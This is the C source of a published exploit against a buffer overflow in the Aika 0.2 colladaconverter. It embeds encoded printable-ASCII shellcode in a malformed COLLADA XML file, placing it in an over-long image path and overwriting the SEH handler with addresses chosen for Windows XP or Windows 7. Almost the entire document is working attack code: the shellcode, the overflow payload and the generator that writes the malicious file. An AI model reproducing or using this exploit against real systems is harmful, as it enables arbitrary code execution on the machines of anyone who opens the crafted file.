/*
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	# Exploit Title: Aika colladaconverter buffer overflow exploit
	# Date: 09/11/2011
	# Author: isciurus
	# Software Link: http://aika.googlecode.com/files/aika-v02.zip
	# Version: 0.2
	# Tested on: Windows 7 x64
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/gpl-3.0.html>.
 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include "string.h"

char printableASCIIShellcode[] = 	// encoded 499 bytes
	"WUQQUj3hKzJYSaRYjVCX4VGRH4z0BfXRQPPZjQX4QP2BM0BMX2Ai0BMXYZPOCKHG" // will be injected inside the file path ---------
	"OHOCHGCKHKkAgFCBMGKJEA3Ag2Bg0BgABE94ku2QmAiAszHthbzMIMQ8Uz9TFQWC" //                                                |
	"GDNW6jYeJ8l47kSCPlKPRZljwLskRH6RQ0OiKjRENz4TUYHTfu6rjMTi1NAjGwMF" //                                                |
	"RHxIjxgzoZnVXlGIXJbCJYhxKHXKvjyFXDDLbNydxzXT3vTJdfa7Hpp3VM1jUOVv" //                                                |
	"UJYuPT3vkOQIPYGxa6Rk6NOaV9PEH56Mrrz5ZSPLOAvKIsFOCbfqWBRXPCNWSmJf" //                                                |
	"EVCXNoYNR9oDOaWoykz1Ev3TxcSHQz4ZOOLxlGBjsDGWGJs1EOCNqaAAOWHAMWCx" //                                                |
	"JEFIrTQ70vEFELaCIPPAPP0GUSmGfq1ZioUNQQATGCISZuJHNKRnlC3baNSAvIRO" //                                                |
	"HLvt4zVFHLkLxBQR5XsKpEN90RgdBZlNmISLELGsEL0myBVKzJY";             //                                                |
                                                                       //                                                |
char xml[] =                                                           //                                                |
	"<?xml version=\"1.0\" encoding=\"utf8\"?>"                        //                                                |
	"<COLLADA xmlns=\"http://www.collada.org/2005/11/COLLADASchema\" version=\"1.4.1\">" //                              |
    "<asset>"                                                                            //                              |
    "    <contributor>"                                                                  //                              |
    "        <author>isciurus</author>"                                                  //                              |
    "        <comments>The shellcode encoded with http://www.exploit-db.com/exploits/13286/</comments>" //               |
    "    </contributor>"                                                                 //                              |
    "    <created>2011-09-04T22:29:59Z</created>"                                        //                              |
    "    <modified>2011-09-04T22:29:59Z</modified>"                                      //                              |
    "    <unit meter=\"0.01\" name=\"centimeter\"/>"                                     //                              |
    "    <up_axis>Y_UP</up_axis>"                                                        //                              |
    "</asset>"                                                                           //                              |
    "<library_cameras>"                                                                  //                              |
    "    <camera id=\"cameraShape1\" name=\"cameraShape1\">"                             //                              |
    "        <optics>"                                                                   //                              |
    "            <technique_common>"                                                     //                              |
    "                <perspective>"                                                      //                              |
    "                    <yfov>37.8492</yfov>"                                           //                              |
    "                    <aspect_ratio>1.5</aspect_ratio>"                               //                              |
    "                    <znear>1</znear>"                                               //                              |
    "                    <zfar>10000</zfar>"                                             //                              |
    "                </perspective>"                                                     //                              |
    "            </technique_common>"                                                    //                              |
    "        </optics>"                                                                  //                              |
    "    </camera>"                                                                      //                              |
    "</library_cameras>"                                                                 //                              |
    "<library_lights></library_lights>"                                                  //                              |
    "<library_images>"                                                                   //                              |
    "    <image id=\"file2\" name=\"file2\" depth=\"1\">"                                //                              |
    "        <init_from>E:\\aika\\"                                                      //  <---------------------------
	"SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
    "SSSSSSSSSSSSSSADDR_1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	//             ^
	//             | 
	//              ------------------------------------------------- the shellcode will be copied at this address
    "AAAAA"
	"		</init_from>"
    "    </image>"
	"	<image id=\"file3\" name=\"file3\" depth=\"1\">"
    "        <init_from>E:\\aika\\"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBADDR_2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	//       ^
	//       | 
	//        -------------------------------------------------------- these bytes will overwrite SEH handler
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // this part forces the application to write outside							
	"AAAAAAAAAAAAAAAAAAAA"	                                          // the stack and triggers AV exception		
	"		</init_from>"
    "    </image>"
    "</library_images>"
    "<library_materials>"
    "    <material id=\"blinn3\" name=\"blinn3\">"
    "        <instance_effect url=\"#blinn3-fx\"/>"
    "    </material>"
    "</library_materials>"
    "<library_geometries>"
    "    <geometry id=\"LOD3spShape-lib\" name=\"LOD3spShape\">"
    "        <mesh>"
    "            <source id=\"LOD3spShape-lib-positions\" name=\"position\">"
    "                <technique_common>"
    "                    <accessor count=\"2108\" offset=\"0\" source=\"#LOD3spShape-lib-positions-array\" stride=\"3\">"
    "                        <param name=\"X\" type=\"float\"/>"
    "                        <param name=\"Y\" type=\"float\"/>"
    "                        <param name=\"Z\" type=\"float\"/>"
    "                    </accessor>"
    "                </technique_common>"
    "            </source>"
    "            <source id=\"LOD3spShape-lib-normals\" name=\"normal\">"
    "                <technique_common>"
    "                    <accessor count=\"2290\" offset=\"0\" source=\"#LOD3spShape-lib-normals-array\" stride=\"3\">"
    "                        <param name=\"X\" type=\"float\"/>"
    "                        <param name=\"Y\" type=\"float\"/>"
    "                        <param name=\"Z\" type=\"float\"/>"
    "                    </accessor>"
    "                </technique_common>"
    "            </source>"
    "            <source id=\"LOD3spShape-lib-map1\" name=\"map1\">"
    "                <technique_common>"
    "                    <accessor count=\"2277\" offset=\"0\" source=\"#LOD3spShape-lib-map1-array\" stride=\"2\">"
    "                        <param name=\"S\" type=\"float\"/>"
    "                        <param name=\"T\" type=\"float\"/>"
    "                    </accessor>"
    "                </technique_common>"
    "            </source>"
    "            <vertices id=\"LOD3spShape-lib-vertices\">"
    "                <input semantic=\"POSITION\" source=\"#LOD3spShape-lib-positions\"/>"
    "            </vertices>"
    "            <triangles count=\"4212\" material=\"blinn3SG\">"
    "                <input offset=\"0\" semantic=\"VERTEX\" source=\"#LOD3spShape-lib-vertices\"/>"
    "                <input offset=\"1\" semantic=\"NORMAL\" source=\"#LOD3spShape-lib-normals\"/>"
    "                <input offset=\"2\" semantic=\"TEXCOORD\" source=\"#LOD3spShape-lib-map1\" set=\"0\"/>"
    "                <p>375</p>"
    "            </triangles>"
    "        </mesh>"
    "    </geometry>"
    "</library_geometries>"
    "<scene>"
    "    <instance_visual_scene url=\"#VisualSceneNode\"/>"
    "</scene>"
	"</COLLADA>";

int main(int argc, char **argv)
{
	FILE *xml_file;
	char win7;
	char *offset;
	char *ll;

	if(argc < 2)
	{
		printf("\nUsage: aika_bof <malformed_collada_xml_path>");
		return 0;
	}

	if(sizeof(printableASCIIShellcode) > 644)
	{
		printf("\nSorry, the shellcode is too long, 644 chars is maximum");
		return 0;
	}
	
	while(1)
	{
		char os;

		printf("\nChoose OS version ([X] for Windows XP, [7] for Windows 7):");
		os = tolower(getchar());
		
		if(os == 'x')
		{
			win7 = 0;
			break;
		}
		else if(os == '7')
		{
			win7 = 1;
			break;
		}
		else
		{
			printf("\nUnknown OS version");
		}
	}

	printf("\n[*] Injecting the shellcode into the xml...");

	offset = strstr(xml, "SSSSSSSSSSSSSSSSSSSSSSSSSSSS");
	strncpy(offset, printableASCIIShellcode, sizeof(printableASCIIShellcode) - 1);
	
	if(win7 == 1)
	{
		offset = strstr(xml, "ADDR_1");
		strncpy(offset, "%40%02", sizeof("%40%02") -1);
		offset = strstr(xml, "ADDR_2");
		strncpy(offset, "%40%02", sizeof("%40%02") -1);
	}
	else
	{
		offset = strstr(xml, "ADDR_1");
		strncpy(offset, "%40%01", sizeof("%40%01") -1);
		offset = strstr(xml, "ADDR_2");
		strncpy(offset, "%40%01", sizeof("%40%01") -1);
	}

	printf("done");

	printf("\n[*] Writing %d bytes to %s...", sizeof(xml), argv[1]);
	
	xml_file = fopen(argv[1], "wb");
	if(xml_file == NULL)
	{
		printf("\nerror while opening %s", argv[1]);
		return 0;
	}
	
	if(fwrite(xml, 1, sizeof(xml) - 1, xml_file) != sizeof(xml) - 1)
	{
		printf("\nerror while writing into %s", argv[1]);
		return 0;
	}

	printf("done");	
}

	